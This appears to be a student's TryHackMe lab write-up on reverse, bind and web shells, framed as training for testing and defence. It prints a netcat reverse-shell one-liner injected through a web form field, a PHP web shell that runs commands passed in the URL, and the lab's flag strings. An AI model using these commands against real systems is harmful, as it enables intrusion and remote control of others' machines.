# [Offensive Security Tooling]

**TryHackMe Path**: [Cyber Security 101]  
**Lab Topic**: [Shells Overview]  
**Date Completed**: [09/24/2025]

---

## 🧠 Summary

> In this lab, I learned about the importance of understanding the different shells in offensive security, which is that shells are the attacker's primary interface on a compromised host - mastering them
turns raw access into proper control: exploration, persistence, privilege escalation, pivoting, data exfiltration, and clean reporting. If you can't use shells well, you can't do meaningful post-
exploitation or effectively emulate a real attacker - and you won't know how to detect or defend against those actions either. Next, I learned about the importance of understanding how to set up and use
Reverse and Bind Shells are fundamental attacker tools. Knowing what they are, how they differ, and how they behave allows you to simulate real attacks responsibly, detect them quickly, and build defenses
that stop actual intrusions. Finally, I learned about the importance of understanding how to deploy Web Shells, which is that they are essential for defenders and responsible testers because web shells
are a common attacker technique - understanding what they are, how attackers abuse them, and how to detect/mitigate them turns a scary, real-world risk into something you can prevent, detect, and respond
to safely.

---

## 🎯 Objectives
- [ ] Learn about Shells in Offensive Security
- [ ] Learn how to set up and use Reverse and Bind Shells
- [ ] Learn how to deploy Web Shells
      
---

## 🧰 Tools Used
- THM AttackBox
- THM Mozilla FireFox

---

## 📊 Analysis & Screenshots

*** Practical Task (Reverse Shell) ***

> After launching the THM Machine, I read through all the Shell types, learned about them, and was given a task at the end. The first one was to find a flag that was saved in the "/" directory using a
reverse/bind shell. To do this, I first had to navigate to the website "10.201.61.117.8080" within Mozilla Firefox and was prompted to the Reverse/Bind Shell Task & Web Shell Task.

> <img width="951" height="532" alt="shell1" src="https://github.com/user-attachments/assets/963d9cea-11a9-4327-973c-38fbdd6aed95" />

> I then went ahead and opened up the Linux terminal and used Netcat to listen to a connection by inputting "nc -lvnp 4444," then "enter."

> <img width="475" height="160" alt="shell2" src="https://github.com/user-attachments/assets/c842ae6e-d306-43d6-93f9-f75728b75cc6" />

> Then, I selected "Reverse/Bind Shell task" and was prompted with an input field called "Hash The File", so I went ahead and input the command syntax
"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.201.54.152 4444 >/tmp/f," and pressed submit button.

> <img width="987" height="457" alt="Screenshot 2025-09-24 at 2 01 46 PM" src="https://github.com/user-attachments/assets/9b3f4461-4b28-41a2-869d-9d11ca139b9a" />

> I then returned to my Netcat Listener and saw that the connection had been received, and I entered the Reverse Shell.

> <img width="536" height="113" alt="shell3" src="https://github.com/user-attachments/assets/ddebedc8-35a0-4f0a-b07c-9db43b4f8b9b" />

> I then entered "cd /," then "enter" to get to the "/ directory," then "ls," then "enter" to list all the files within the "/ directory," and saw the file "flag.txt" within the directory.

> <img width="445" height="439" alt="shell4" src="https://github.com/user-attachments/assets/6724eb20-ee7b-4420-91dd-141e4988a084" />

> Finally, I typed "cat flag.txt" and then pressed "Enter" to retrieve the flag, which returned "THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}."

> <img width="531" height="72" alt="shell5" src="https://github.com/user-attachments/assets/5c254fc7-32ca-4e85-b29e-c2199b23c943" />

*** Practical Task (Web Shell) ***

> For the next question, I had to use the web shell, exploit the unrestricted file upload vulnerability, get a shell, and then find a flag saved in the "/" directory. First, I had to open the Linux terminal
and listen to a connection using Netcat. I did this by entering the command "nc -lvnp 4444" and then pressing "enter."

> <img width="441" height="71" alt="shell6" src="https://github.com/user-attachments/assets/f1c17497-58f3-441d-83f6-aa21ae01d04b" />

> I then went back to the website "10.201.61.117.8080" and selected the "Web Shell Task"

> <img width="951" height="532" alt="shell1" src="https://github.com/user-attachments/assets/350f78b4-ced2-4ece-8dbc-1dd5b7b1c213" />
> <img width="1039" height="868" alt="shell7" src="https://github.com/user-attachments/assets/c6814646-ec1f-4717-8379-d50442552cce" />

> I then opened a new tab alongside the tab with the Netcat listener and created a "shell.php" file by entering the command "nano shell.php." After creating the file with nano, I then input the
following code within the "shell.php" file:
"<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>"
saved it and exited it.

> <img width="628" height="215" alt="shell8" src="https://github.com/user-attachments/assets/43e49930-a623-489b-9722-ea2aa780d715" />

> I then returned to Mozilla Firefox on the website "10.201.45.90:8082," clicked the "Browse" button, selected the "shell.php" file, and pressed "Upload your CV."

> <img width="641" height="489" alt="shell9" src="https://github.com/user-attachments/assets/3af652d9-34c6-427f-af9a-3ce18a93fe36" />
> <img width="532" height="171" alt="shell10" src="https://github.com/user-attachments/assets/9c3a7e94-d253-4f0f-8a2e-5f1367463237" />

> After successfully uploading the file, I then edited the text within the searchbar of the website "10.201.61.117:8082" from "10.201.61.117:8082/uploads" to
"10.201.61.117:8082/uploads/shell.php?cmd= cat /flag.txt" to retrieve the flag "THM{202bb14ed12120b31300cfbbbdd35998786b44e5}."

> <img width="746" height="209" alt="shell11" src="https://github.com/user-attachments/assets/aceb6f9a-913c-472b-8781-37642a20921f" />

---

## Reflection

> This lab provided me with knowledge about the different type of shells.
